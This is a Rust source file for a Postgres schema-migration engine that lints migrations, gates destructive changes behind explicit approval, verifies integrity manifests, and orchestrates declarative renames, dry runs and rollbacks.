//! The public `MigrationEngine` API — `plan` (lint/preview) → `gate` (approval)
//! → [`executor::apply`](crate::executor::apply) (guard + role) (design §3 / §1.6).
//!
//! This is the surface a caller (control plane / CLI / builder) drives. The
//! pieces beneath it — the [`SqlGuard`](crate::guard::SqlGuard), the Postgres
//! [`apply`](crate::executor::apply) flow, the least-privilege
//! [`migrator` role](crate::role) — are already built; the engine *composes*
//! them into the documented pipeline:
//!
//! 1. an **author** (see [`crate::author`]) produces the [`Migration`]s;
//! 2. [`MigrationEngine::plan`] runs the guard over every migration **read-only**
//!    (no DB) and returns a [`MigrationPlan`] — the dry-run / preview (scenario
//!    45): which migrations are destructive, which require approval, and which
//!    are *denied* (un-appliable);
//! 3. [`MigrationEngine::apply`] is the **gate**: it refuses a plan with any
//!    denial, refuses a destructive plan without explicit [`Approval::Approved`],
//!    and otherwise delegates to [`executor::apply`](crate::executor::apply).
//!
//! **Defense in depth — the gate is additional, not a replacement.**
//! [`executor::apply`](crate::executor::apply) *re-runs* the guard over every
//! pending `up` and runs the DDL under the least-privilege `migrator` role
//! (lines 1 & 2 of §1). The engine gate is a third check layered in front: even
//! if a caller hand-built a plan, the executor still independently denies the
//! dangerous surface and confines execution. The engine never disables those.

use compio_postgres::Client;

pub use crate::approval::Approval;
use crate::db::ExecutorConfig;
use crate::executor::{
    self, ApplyError, ApplyOutcome, LockMode, RollbackError, RollbackOutcome, RollbackRequest,
};
use crate::guard::{GuardConfig, GuardError, GuardReport, SqlGuard};
use crate::manifest::{compute_manifest, verify_manifest, ManifestError, ManifestHash};
use crate::migration::Migration;

/// One linted migration in a [`MigrationPlan`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedMigration {
    /// The migration itself (clone of the input).
    pub migration: Migration,
    /// Its passing guard report (classes + destructive flag + operational
    /// [`Advisory`](crate::analyze::Advisory)s).
    pub report: GuardReport,
}

/// The read-only result of [`MigrationEngine::plan`] — the dry-run / preview
/// (design scenario 45).
///
/// A plan is **un-appliable** if [`denied`](Self::denied) is non-empty: the
/// guard hard-denied at least one migration's `up` (RCE / cross-tenant / file /
/// network), so [`MigrationEngine::apply`] refuses it outright.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MigrationPlan {
    /// The migrations that passed the guard, with their reports, in input order.
    pub items: Vec<PlannedMigration>,
    /// `true` if any planned item is destructive (data loss) — either the guard's
    /// SQL-text classification or the migration's own `flags.destructive`.
    pub destructive: bool,
    /// `true` if applying this plan requires explicit approval. Usually tracks
    /// `destructive`, but an author may stamp `flags.requires_approval` on an op
    /// the guard reads as non-destructive (e.g. a UNIQUE-index DROP, #4) so it is
    /// gated independently of the SQL-text data-loss judgement.
    pub requires_approval: bool,
    /// Migrations the guard **denied**, as `(version, error)`. A non-empty list
    /// makes the whole plan un-appliable — `apply` returns
    /// [`EngineError::Denied`] and runs nothing.
    pub denied: Vec<(String, GuardError)>,
}

impl MigrationPlan {
    /// `true` if the plan can be applied (no denials).
    #[must_use]
    pub const fn is_appliable(&self) -> bool {
        self.denied.is_empty()
    }
}

/// A failure from [`MigrationEngine::apply`].
#[derive(Debug, thiserror::Error)]
pub enum EngineError {
    /// The plan contains guard denials and can never be applied. Carries the
    /// denied `(version, error)` pairs for reporting. Nothing was applied.
    #[error("plan is un-appliable: {} migration(s) denied by the guard", .0.len())]
    Denied(Vec<(String, GuardError)>),
    /// The plan is destructive (or otherwise requires approval) but
    /// [`Approval::Approved`] was not given. Nothing was applied.
    #[error("plan requires approval (destructive) but none was given")]
    ApprovalRequired,
    /// The executor failed (DB error, checksum drift, mid-apply failure, or the
    /// executor's own re-run of the guard denied a migration — defense in depth).
    #[error(transparent)]
    Apply(#[from] ApplyError),
    /// The supplied migration set did not match the expected integrity manifest
    /// (v3 Plan F) — the bundle was reordered / edited / inserted-into / removed-
    /// from relative to the trusted [`ManifestHash`] stamped at build/review time.
    /// Refused by [`MigrationEngine::apply_verified`] **before** the advisory lock
    /// or any DDL: NOTHING was applied. Carries the
    /// [`ManifestError`](crate::manifest::ManifestError) diagnostic.
    #[error(transparent)]
    Manifest(#[from] ManifestError),
}

/// A failure from [`MigrationEngine::rollback`].
#[derive(Debug, thiserror::Error)]
pub enum RollbackEngineError {
    /// Rollback is destructive (a `down` typically drops/reverses schema) and
    /// requires explicit [`Approval::Approved`], which was not given. Nothing was
    /// rolled back.
    #[error("rollback requires approval (a down is destructive) but none was given")]
    ApprovalRequired,
    /// The executor's rollback failed (guard denial on a `down`, irreversible
    /// without force, checksum drift, mid-rollback DB error, …).
    #[error(transparent)]
    Rollback(#[from] RollbackError),
}

/// The public migration engine (design §3 `MigrationEngine` seam).
#[derive(Debug, Clone, Default)]
pub struct MigrationEngine;

impl MigrationEngine {
    /// Construct the engine. (Stateless; the executor + guard config are passed
    /// per call so one engine serves every project.)
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Lint + preview a migration set **read-only** (no DB) — the dry-run /
    /// plan phase (design scenario 45).
    ///
    /// Runs the [`SqlGuard`] over every migration's `up`. A guard **denial** is
    /// recorded in [`MigrationPlan::denied`] (and the migration is *not* added to
    /// `items`), so a caller sees **every** problem in the set at once rather
    /// than aborting on the first. `destructive` / `requires_approval` are `true`
    /// if any passing item's report flags data loss.
    #[must_use]
    pub fn plan(&self, migrations: &[Migration], cfg: &GuardConfig) -> MigrationPlan {
        let guard = SqlGuard::new(cfg.clone());
        let mut items = Vec::new();
        let mut denied = Vec::new();
        let mut destructive = false;
        let mut requires_approval = false;
        for m in migrations {
            match guard.check(&m.up) {
                Ok(report) => {
                    // A plan is destructive / approval-gated if EITHER the guard's
                    // SQL-text classification flags data loss OR the author stamped
                    // the migration's own flags. The author flag matters for ops
                    // the guard cannot judge from SQL text alone: a `DROP INDEX` of
                    // a UNIQUE index reads as a plain (reversible) index drop to the
                    // guard, but it silently removes a data-integrity guarantee, so
                    // the declarative author marks it `destructive + requires_approval`
                    // (#4) — and the executor's own gate already honours that flag,
                    // so the plan summary must agree (otherwise the engine would
                    // report a non-gated plan that the executor then refuses).
                    destructive |= report.destructive || m.flags.destructive;
                    requires_approval |= report.destructive || m.flags.requires_approval;
                    items.push(PlannedMigration {
                        migration: m.clone(),
                        report,
                    });
                }
                Err(e) => denied.push((m.version.as_str().to_string(), e)),
            }
        }
        MigrationPlan {
            items,
            destructive,
            requires_approval,
            denied,
        }
    }

    /// Diff a **desired** declarative schema against the **live** snapshot and
    /// lint the generated migrations into a [`MigrationPlan`] (v3 Plan A).
    ///
    /// This is the declarative entry point: it runs
    /// [`DeclarativeAuthor::diff`](crate::declarative::DeclarativeAuthor::diff)
    /// (additive ops + destructive-gated drops, with author-boundary name/type
    /// validation) and then feeds the result through the EXISTING [`plan`] —
    /// so the generated SQL gets the same guard treatment as any other author's
    /// output (no bypass). A destructive drop in the diff makes the plan
    /// `requires_approval`, exactly as a hand-authored drop would.
    ///
    /// `hints` are the OPT-IN [`RenameHint`](crate::declarative::RenameHint)s
    /// (P3): each routes a hinted drop+add pair through the zero-downtime
    /// expand-contract rename sequence instead of an independent drop + add.
    /// Without a matching hint a drop+add stays two independent ops — the differ
    /// NEVER infers a rename heuristically. An empty slice ⇒ pure P0–P2 behaviour.
    ///
    /// # A declarative rename is an online, multi-deploy op (C1)
    ///
    /// A hinted rename is NOT folded into the linted plain plan: a rename's
    /// [`ExpandContractPlan`](crate::expand_contract::ExpandContractPlan) carries a
    /// [`BackfillSpec`](crate::backfill::BackfillSpec) that must run the REAL
    /// pre-existing-row mirror (see [`run_expand`](Self::run_expand)). Flattening
    /// it through the plain `plan` → `apply` path would discard the backfill and
    /// the contract `DROP COLUMN <from>` would then destroy un-mirrored rows. So
    /// the result keeps the plain migrations and the renames SEPARATE; drive the
    /// whole thing through [`apply_declarative`](Self::apply_declarative).
    ///
    /// # Caller contract
    ///
    /// `desired` MUST be the **COMPLETE project union** (every member app's
    /// descriptors), and `live_ownership` MUST carry an entry (`live table name →
    /// owning app`) for **every live table**, supplied from the journal / route
    /// registry. These are the differ's fail-closed guard against a PARTIAL-union
    /// deploy mass-dropping other tenants' tables (2b): a `DROP TABLE` is authored
    /// only when `live_ownership` confirms the deploying app owns that table; an
    /// other-owned or ownership-unknown live table being dropped fails closed
    /// (refused) rather than authoring a destructive foreign drop. See
    /// [`DeclarativeAuthor::diff`](crate::declarative::DeclarativeAuthor::diff).
    ///
    /// # Errors
    /// [`DeclarativeError`](crate::declarative::DeclarativeError) if the diff
    /// hits an unsupported op, an unmatched/type-mismatched rename hint, an
    /// invalid descriptor name/type at the author boundary, or a refused drop
    /// (`NotTableOwner` / `DropOfUnownedTable` — fail-closed drop ownership). A
    /// guard *denial* on generated SQL is NOT an error here — it lands in
    /// [`MigrationPlan::denied`] like any other.
    pub fn plan_declarative(
        &self,
        desired: &crate::declarative::DesiredSchema,
        live: &crate::drift::SchemaSnapshot,
        live_ownership: &std::collections::HashMap<String, String>,
        author: &crate::declarative::DeclarativeAuthor,
        hints: &[crate::declarative::RenameHint],
        cfg: &GuardConfig,
    ) -> Result<DeclarativeDeployPlan, crate::declarative::DeclarativeError> {
        let diff = author.diff(desired, live, live_ownership, hints)?;
        // C1 — FAIL CLOSED on SQLite rebuilds. `plan_declarative` builds the plan
        // from `diff.migrations` + `diff.renames` only; it does NOT carry
        // `diff.rebuilds` (the SQLite 12-step table rebuilds), and `MigrationEngine`
        // is PG-typed (it drives `apply` over a PG `Client`). If a SQLite declarative
        // deploy needs a rebuild and we silently dropped it, the deploy would report
        // SUCCESS while the rebuild never ran — a silent data-shape no-op. There is
        // no SQLite engine apply path / approval gate yet (the
        // `SqliteBackend::rebuild_one` seam is executor-internal and ungated); wiring
        // it is the next phase (P6). Until then, refuse rather than drop.
        if !diff.rebuilds.is_empty() {
            let first = &diff.rebuilds[0];
            return Err(crate::declarative::DeclarativeError::SqliteRebuildRequired {
                table: first.spec.table.clone(),
                op: format!(
                    "{} SQLite table rebuild(s) required (e.g. '{}': {}); no SQLite engine \
                     apply path / approval gate is wired yet (P6). Refusing to drop them \
                     silently",
                    diff.rebuilds.len(),
                    first.spec.table,
                    first.spec.reason,
                ),
            });
        }
        let plain = self.plan(&diff.migrations, cfg);
        Ok(DeclarativeDeployPlan {
            plain,
            renames: diff.renames,
        })
    }

    /// Apply a declarative deploy plan as the **online, multi-deploy** operation
    /// it is (C1 — never flatten a rename).
    ///
    /// In one call (deploy N) it:
    /// 1. applies the **plain** migrations through the existing gated
    ///    [`apply`](Self::apply) (denial / approval gate + the executor's own
    ///    guard + least-privilege role); then
    /// 2. for each rename, drives the **expand** through
    ///    [`run_expand`](Self::run_expand) — which applies E1 (ADD COLUMN) + E2
    ///    (dual-write trigger), runs the REAL [`run_backfill`] mirroring every
    ///    pre-existing `<from>` value into `<to>`, and journals E3 **only after**
    ///    the backfill succeeds (Plan-8 data-integrity ordering); and
    /// 3. collects every rename's **contract** (DROP TRIGGER C1 + DROP COLUMN
    ///    `<from>` C2) into [`DeclarativeDeployOutcome::pending_contract`] —
    ///    the DEFERRED set to apply in a SUBSEQUENT deploy, AFTER the app's code
    ///    has switched from `<from>` to `<to>`.
    ///
    /// The contract is deliberately NOT applied here: the executor's
    /// expand/contract gate refuses a contract while its own expand is still
    /// pending in the same batch, and — more importantly — dropping `<from>`
    /// before old code stops reading it breaks the rolling fleet. Surfacing the
    /// contract as `pending_contract` makes the multi-deploy partition explicit.
    ///
    /// # Deploy sequence
    /// ```text
    /// deploy N    : apply_declarative(plan)  →  plain + EXPAND (backfill runs);
    ///               returns pending_contract.  Code still uses <from>; <to> is
    ///               populated + dual-written.
    /// (code switch): a later app deploy reads/writes <to> only.
    /// deploy N+1  : engine.apply(plan_of(pending_contract), Approved, …)  →
    ///               DROP TRIGGER + DROP COLUMN <from>.  Zero data loss: every
    ///               row's value already lives in <to>.
    /// ```
    ///
    /// `approval` must be [`Approval::Approved`] when the plain plan is gated OR
    /// any rename is present (the expand's backfill mutates data). The
    /// `pending_contract` set is itself gated (`requires_approval`, and C2 is
    /// `destructive`), so applying it later also needs approval.
    ///
    /// # Errors
    /// - [`DeclarativeApplyError::Plain`] — the gated plain `apply` failed
    ///   (denial, missing approval, or an executor failure). No expand ran.
    /// - [`DeclarativeApplyError::Expand`] — a rename's expand/backfill failed.
    ///   The plain migrations + any earlier renames are already applied; the
    ///   backfill is resumable on a re-run.
    pub async fn apply_declarative(
        &self,
        plan: &DeclarativeDeployPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // H10 — hold the project advisory lock for the WHOLE declarative deploy.
        //
        // A declarative deploy is several sub-batches: the plain set plus one
        // expand per rename, each of which (left to itself) would acquire AND
        // RELEASE the project advisory lock. Releasing between sub-batches frees
        // the lock, letting a concurrent deploy for the SAME project interleave
        // its own sub-batch — so a multi-rename deploy would NOT be serialized as
        // a whole, violating design §2.3 ("serialize ALL migration activity").
        //
        // Fix: acquire the lock ONCE here, drive every inner sub-batch with
        // `LockMode::AlreadyHeld` (skip their acquire/release), and release ONCE
        // on EVERY exit path below (success/error/early-return) — mirroring
        // `executor::apply`'s release-on-every-path discipline. The lock is taken
        // exactly once and freed exactly once per declarative deploy; it is never
        // free between sub-batches.
        //
        // We acquire the lock BEFORE the gate's denial/approval check is performed
        // inside `apply_inner`; that check still runs (with `AlreadyHeld`) and can
        // return early — every such early return runs through `release_or_warn`
        // below, so the lock is never held forever on a gate rejection.
        executor::acquire_project_lock_outer(conn, &exec_cfg.project_id)
            .await
            .map_err(EngineError::from)?;

        let result = self
            .apply_declarative_locked(plan, approval, conn, exec_cfg, applied_by)
            .await;

        // Release on EVERY path. Surface the deploy error first; a release failure
        // is logged (the lock auto-releases on session end regardless).
        if let Err(e) =
            executor::release_project_lock_outer(conn, &exec_cfg.project_id).await
        {
            tracing::warn!(
                error = %e,
                project = %exec_cfg.project_id,
                "zeroship-migrate: failed to release project lock after apply_declarative (H10)"
            );
        }

        result
    }

    /// Apply a declarative deploy plan, **verifying its set-level integrity
    /// manifest first** (v3 Plan F — the declarative peer of
    /// [`apply_verified`](Self::apply_verified), closing the H1 coverage gap).
    ///
    /// This is the trusted-deploy entry point for the DECLARATIVE (AI-driven)
    /// path. Before ANY apply work — before the denial/approval gate, before the
    /// H10 outer project advisory lock, before a single statement of DDL —
    /// it recomputes the integrity manifest over the plan's **full effective
    /// migration set** ([`DeclarativeDeployPlan::manifest`]) and compares it to
    /// `expected`. A mismatch (the generated plan was reordered / content-edited /
    /// inserted-into / removed-from between the control plane STAMPING it and this
    /// APPLY) returns [`EngineError::Manifest`] — surfaced as
    /// [`DeclarativeApplyError::Plain`] — and applies NOTHING: no lock taken, no
    /// journal touched, no DDL run. A match falls through to the normal
    /// [`apply_declarative`](Self::apply_declarative) orchestration.
    ///
    /// # The effective set is what the executor actually runs
    ///
    /// A declarative deploy is the plain migrations PLUS, per rename, that
    /// rename's expand AND its (deferred) contract migrations. The manifest is
    /// computed over EXACTLY that set (see [`DeclarativeDeployPlan::manifest`]),
    /// folded in the canonical executed order [`compute_manifest`] already
    /// applies. So a tamper of a plain migration, a rename's expand, OR the
    /// deferred contract is all caught at deploy N's verify — even though the
    /// contract is only APPLIED in a later deploy N+1. The stamp must cover the
    /// whole generated plan, including the deferred drop.
    ///
    /// # Determinism caveat — stamp + apply ONE generated plan instance
    ///
    /// Declarative migration versions are freshly minted per
    /// [`plan_declarative`](Self::plan_declarative) call (`UUIDv7`), so a given
    /// manifest is only stable for a SPECIFIC generated [`DeclarativeDeployPlan`]
    /// instance. The control plane MUST generate the plan ONCE, compute the stamp
    /// with [`DeclarativeDeployPlan::manifest`] over THAT instance, hold the plan
    /// out-of-band, and apply THAT SAME plan here — it must NOT re-generate
    /// between stamp and apply (a fresh `plan_declarative` would mint new versions
    /// and never match). The stamp side and this verify side call the SAME
    /// `manifest()` implementation, so they cannot diverge.
    ///
    /// # Trust model — caller contract
    ///
    /// `expected` MUST come from a TRUSTED source (the control plane, stamping at
    /// build / review time and holding it out-of-band), NOT from the same bundle
    /// the plan arrived in — see [`crate::manifest`]'s trust model and
    /// [`apply_verified`](Self::apply_verified).
    ///
    /// # Errors
    /// - [`DeclarativeApplyError::Plain`] wrapping [`EngineError::Manifest`] — the
    ///   effective set did not match `expected`. Refused before the gate / lock /
    ///   DDL; nothing applied.
    /// - [`DeclarativeApplyError::Plain`] / [`DeclarativeApplyError::Expand`] — the
    ///   same gate + executor + expand errors as
    ///   [`apply_declarative`](Self::apply_declarative), after a successful
    ///   manifest check.
    pub async fn apply_declarative_verified(
        &self,
        plan: &DeclarativeDeployPlan,
        expected: &ManifestHash,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // Pre-apply manifest gate over the plan's FULL EFFECTIVE set (plain +
        // every rename's expand + contract), folded in canonical executed order by
        // the SAME implementation the control plane stamped with. This runs BEFORE
        // `apply_declarative` (and therefore before the H10 outer advisory lock and
        // any DDL): a tampered plan is rejected without contending for the lock or
        // opening a transaction, leaving the database + journal untouched.
        verify_manifest(&plan.effective_set(), expected).map_err(EngineError::from)?;
        // Verified ⇒ the normal gated, lock-wrapped declarative orchestration.
        self.apply_declarative(plan, approval, conn, exec_cfg, applied_by)
            .await
    }

    /// The body of [`apply_declarative`](Self::apply_declarative), run while the
    /// outer project advisory lock is held (H10). Each inner sub-batch is driven
    /// with [`LockMode::AlreadyHeld`] so it does NOT re-acquire / re-release the
    /// lock — the lock is owned by `apply_declarative` for the whole deploy.
    async fn apply_declarative_locked(
        &self,
        plan: &DeclarativeDeployPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // 1. The plain additive / destructive set, through the existing gate
        //    (denial / approval), but with the lock already held outside it.
        let mut applied = self
            .apply_inner(&plan.plain, approval, conn, exec_cfg, applied_by, LockMode::AlreadyHeld)
            .await?;

        // 2. Each rename's EXPAND, through run_expand (real backfill; E3 journaled
        //    after) — also with the lock already held. 3. Collect the contract as
        //    the deferred set.
        let mut pending_contract: Vec<Migration> = Vec::new();
        for rename in &plan.renames {
            let outcome = self
                .run_expand_with_lock(rename, approval, conn, exec_cfg, applied_by, LockMode::AlreadyHeld)
                .await?;
            applied.applied.extend(outcome.applied);
            applied.skipped.extend(outcome.skipped);
            applied.recovered.extend(outcome.recovered);
            pending_contract.extend(rename.contract.iter().cloned());
        }

        Ok(DeclarativeDeployOutcome {
            applied,
            pending_contract,
        })
    }

    /// Apply a plan through the gate (design §1.6).
    ///
    /// The gate, in order:
    /// 1. if [`MigrationPlan::denied`] is non-empty ⇒ [`EngineError::Denied`]
    ///    (never apply — a denied batch applies *nothing*);
    /// 2. if [`MigrationPlan::requires_approval`] and `approval != Approved` ⇒
    ///    [`EngineError::ApprovalRequired`] (nothing applied);
    /// 3. otherwise delegate to [`executor::apply`](crate::executor::apply),
    ///    which **independently re-runs the guard** over every pending `up` and
    ///    runs the DDL under the least-privilege `migrator` role — defense in
    ///    depth, not bypassed by this gate.
    ///
    /// `applied_by` is the actor recorded in the journal (`app/actor/AI`).
    ///
    /// # Errors
    /// - [`EngineError::Denied`] — the plan had guard denials.
    /// - [`EngineError::ApprovalRequired`] — destructive plan without approval.
    /// - [`EngineError::Apply`] — the executor failed (incl. its own guard
    ///   re-check, checksum drift, or a mid-apply DB error).
    pub async fn apply(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Standalone caller: the executor acquires + releases the project lock.
        self.apply_inner(plan, approval, conn, exec_cfg, applied_by, LockMode::Acquire)
            .await
    }

    /// [`apply`](Self::apply) with an explicit [`LockMode`] (H10 mechanism).
    ///
    /// Public peer of [`apply`](Self::apply) for an OUTER caller that already
    /// holds the project advisory lock on `conn` (e.g. the submission adapter,
    /// which acquires the lock around dedup-read → apply to close the
    /// concurrent-double-apply window, HIGH-1). Such a caller passes
    /// [`LockMode::AlreadyHeld`] so the executor does NOT re-acquire / re-release
    /// the lock it does not own; the outer caller is responsible for releasing it
    /// on every exit path. The denial / approval gate runs identically in both
    /// modes.
    ///
    /// # Errors
    /// Same as [`apply`](Self::apply).
    pub async fn apply_with_lock(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, EngineError> {
        self.apply_inner(plan, approval, conn, exec_cfg, applied_by, lock_mode)
            .await
    }

    /// [`apply`](Self::apply) with an explicit [`LockMode`] (H10).
    ///
    /// `LockMode::Acquire` is the standalone path (the executor takes the project
    /// advisory lock per batch). `LockMode::AlreadyHeld` is the declarative path:
    /// [`apply_declarative`](Self::apply_declarative) holds the lock for the whole
    /// deploy, so the inner plain-set apply must NOT re-acquire/re-release it.
    ///
    /// The denial / approval gate runs identically in both modes — an early gate
    /// rejection under `AlreadyHeld` returns without touching the lock (the outer
    /// `apply_declarative` still releases it), so the lock is never leaked.
    async fn apply_inner(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<ApplyOutcome, EngineError> {
        // Gate 1: a denied plan can never be applied.
        if !plan.denied.is_empty() {
            return Err(EngineError::Denied(plan.denied.clone()));
        }
        // Gate 2: destructive plans need explicit approval.
        if plan.requires_approval && approval != Approval::Approved {
            return Err(EngineError::ApprovalRequired);
        }
        // Gate 3: delegate to the executor, which re-runs the guard + role
        // (defense in depth). Reconstruct the migration set from the plan's
        // passing items (denied is empty here, so items == the full input set).
        let migrations: Vec<Migration> =
            plan.items.iter().map(|p| p.migration.clone()).collect();
        // Forward the approval decision: the executor re-runs its OWN destructive
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        let outcome =
            executor::apply_with_lock(conn, exec_cfg, &migrations, approval, applied_by, lock_mode)
                .await?;
        Ok(outcome)
    }

    /// Apply a migration set, **verifying its set-level integrity manifest first**
    /// (v3 Plan F — the pre-apply gate).
    ///
    /// This is the trusted-deploy entry point. Before ANY apply work — before the
    /// guard/approval gate, before [`executor::apply`](crate::executor::apply)
    /// acquires the project advisory lock, before a single statement of DDL runs —
    /// it recomputes the integrity manifest over the SUPPLIED `migrations` (in the
    /// given order) and compares it to `expected`:
    ///
    /// - `Some(expected)` ⇒ **verify-then-apply.** A mismatch (the bundle was
    ///   reordered / content-edited / inserted-into / removed-from relative to the
    ///   trusted manifest) returns [`EngineError::Manifest`] and applies NOTHING —
    ///   no lock taken, no journal touched, no DDL run. A match falls through to
    ///   the normal gated [`apply`](Self::apply).
    /// - `None` ⇒ **apply unverified.** For internal callers that have no manifest
    ///   to check against (e.g. a freshly-authored in-process set that never left
    ///   the trust boundary). Identical to calling [`apply`](Self::apply) directly.
    ///
    /// # Order matters: verify BEFORE the lock
    ///
    /// The verification runs in THIS method, before `apply` (and therefore before
    /// `executor::apply`'s `pg_advisory_lock`). A tampered set is rejected without
    /// ever contending for the lock or opening a transaction — the gate cannot be
    /// raced past, and a refusal leaves the database and journal completely
    /// untouched.
    ///
    /// # Trust model — caller contract
    ///
    /// `expected` MUST be supplied by a **trusted** source: the control plane,
    /// which stamps the [`ManifestHash`] at build / review time and holds it
    /// out-of-band. It MUST NOT be read from the same bundle `migrations` arrived
    /// in — an attacker who can edit the migrations can equally edit a hash
    /// shipped alongside them, and the check would then verify a tampered set
    /// against its own tampered hash (vacuously passing). The manifest is a check
    /// of *the bundle* against *an independently-held expectation*. See
    /// [`crate::manifest`].
    ///
    /// # What set is verified — the RAW supplied set, before any filtering (M1)
    ///
    /// The manifest is verified over the RAW `migrations` slice the caller
    /// supplied — the exact input membership/content the control plane stamped at
    /// review time — **before** [`plan`](Self::plan) runs the guard. This is
    /// deliberate: verifying the post-`plan` `items` would let a guard *denial*
    /// (or any future `plan()`-time filtering) silently SHRINK the verified set, so
    /// the integrity check would pass over a strict subset of the stamped bundle. By
    /// verifying input membership independently of guard filtering, a removed or
    /// inserted migration is always caught against the stamp.
    ///
    /// A guard-denied migration is still PART of the verified set (so the manifest
    /// matches the stamp), and is then refused by the *separate, correct* denial
    /// gate inside [`apply`](Self::apply) ([`EngineError::Denied`]) — a denial and a
    /// manifest mismatch are orthogonal failures, surfaced as orthogonal errors.
    ///
    /// # Errors
    /// - [`EngineError::Manifest`] — the raw supplied set did not match `expected`
    ///   (only possible when `expected` is `Some`). Refused before the
    ///   plan/gate/lock/DDL; nothing applied.
    /// - [`EngineError::Denied`] / [`EngineError::ApprovalRequired`] /
    ///   [`EngineError::Apply`] — the same gate + executor errors as
    ///   [`apply`](Self::apply), after a successful (or skipped) manifest check.
    // M1: takes the RAW supplied set + the guard config (to plan internally) so
    // verification happens over the input membership BEFORE plan()/guard filtering.
    // Eight distinct, irreducible inputs (raw set, guard cfg, expected hash,
    // approval, conn, exec cfg, actor) — each is load-bearing; bundling them into a
    // struct would only obscure the trusted-deploy call shape.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_verified(
        &self,
        migrations: &[Migration],
        guard_cfg: &GuardConfig,
        expected: Option<&ManifestHash>,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Pre-apply manifest gate (v3 Plan F, M1): recompute over the RAW supplied
        // set — the input membership/content the control plane stamped — BEFORE
        // plan()/guard filtering and before the gate / lock / any DDL. Verifying
        // the raw input (not the post-plan `items`) means a guard denial or any
        // future plan-time filtering cannot silently shrink the verified set. The
        // manifest covers every migration's (version, checksum) folded in canonical
        // executed order, so a reorder / edit / insertion / removal is caught here.
        if let Some(expected) = expected {
            verify_manifest(migrations, expected)?;
        }
        // Verified (or unverified by caller choice) ⇒ plan (guard lint) then the
        // normal gated apply, which re-runs the denial/approval gate and then the
        // executor (guard + role + advisory lock). A guard-denied migration was
        // still part of the verified set above; the denial is surfaced HERE by the
        // gate (EngineError::Denied), independent of the manifest check. The lock is
        // only ever taken AFTER the manifest passes.
        let plan = self.plan(migrations, guard_cfg);
        self.apply(&plan, approval, conn, exec_cfg, applied_by).await
    }

    /// Dry-run a migration batch against a throwaway **shadow DATABASE** clone
    /// (v3 Plan C) — a thin delegate to [`crate::shadow::dry_run`].
    ///
    /// Previews the FULL batch against a faithful copy (same `project_schema`
    /// name, confined migrator role, the UNMODIFIED [`executor::apply`] path)
    /// without ever touching the real project DB, then tears the clone down on
    /// every path. The control plane decides WHEN to require a dry-run (the
    /// recommendation is mandatory for destructive / AI-authored sets); this
    /// method is the primitive.
    ///
    /// # Errors
    /// [`crate::shadow::DryRunError`] on a harness failure (CREATE/DROP DATABASE,
    /// the shadow connection, role provisioning). A *migration* failing is not an
    /// error — it is reported in the [`crate::shadow::DryRunReport`].
    pub async fn dry_run(
        &self,
        admin_conn: &Client,
        migrations: &[Migration],
        exec_cfg: &ExecutorConfig,
        shadow_cfg: &crate::shadow::ShadowConfig,
        applied_by: &str,
    ) -> Result<crate::shadow::DryRunReport, crate::shadow::DryRunError> {
        crate::shadow::dry_run(admin_conn, migrations, exec_cfg, shadow_cfg, applied_by).await
    }

    /// Dry-run a DECLARATIVE deploy plan against a shadow DATABASE, validating
    /// the resulting schema against the desired snapshot (v3 Plan C, Phase 2) — a
    /// thin delegate to [`crate::shadow::dry_run_declarative`].
    ///
    /// # Errors
    /// [`crate::shadow::DryRunError`] on a harness failure.
    pub async fn dry_run_declarative(
        &self,
        admin_conn: &Client,
        plan: &DeclarativeDeployPlan,
        desired: &crate::declarative::DesiredSchema,
        exec_cfg: &ExecutorConfig,
        shadow_cfg: &crate::shadow::ShadowConfig,
        applied_by: &str,
    ) -> Result<crate::shadow::DryRunReport, crate::shadow::DryRunError> {
        crate::shadow::dry_run_declarative(
            admin_conn, plan, desired, exec_cfg, shadow_cfg, applied_by,
        )
        .await
    }

    /// Roll back applied migrations to a [`RollbackTarget`] through the gate
    /// (design §5).
    ///
    /// A `down` is privileged SQL that typically **reverses** schema (drops the
    /// objects an `up` created), so rollback is treated as destructive: it
    /// **requires [`Approval::Approved`]** — the AI never auto-rolls-back. Given
    /// approval, it delegates to [`executor::rollback`](crate::executor::rollback),
    /// which **independently** runs every `down` through the guard and under the
    /// least-privilege `migrator` role (defense in depth, identical to the up
    /// path), refuses to cross an irreversible (`down: None`) migration unless
    /// `request.options.force` + `request.options.backup_acknowledged`, and
    /// journals each rollback as an append-only `rolled_back` event.
    ///
    /// `applied_by` is the actor recorded in the journal.
    ///
    /// # Errors
    /// - [`RollbackEngineError::ApprovalRequired`] — `approval != Approved`.
    /// - [`RollbackEngineError::Rollback`] — the executor's rollback failed
    ///   (guard denial on a `down`, irreversible without force, checksum drift,
    ///   missing-from-set, unknown target, or a mid-rollback DB error).
    pub async fn rollback(
        &self,
        migrations: &[Migration],
        request: RollbackRequest,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<RollbackOutcome, RollbackEngineError> {
        // Gate: rollback is destructive ⇒ explicit approval required.
        if approval != Approval::Approved {
            return Err(RollbackEngineError::ApprovalRequired);
        }
        // Forward the approval decision: the executor re-runs its OWN approval
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        let outcome =
            executor::rollback(conn, exec_cfg, migrations, request, approval, applied_by).await?;
        Ok(outcome)
    }

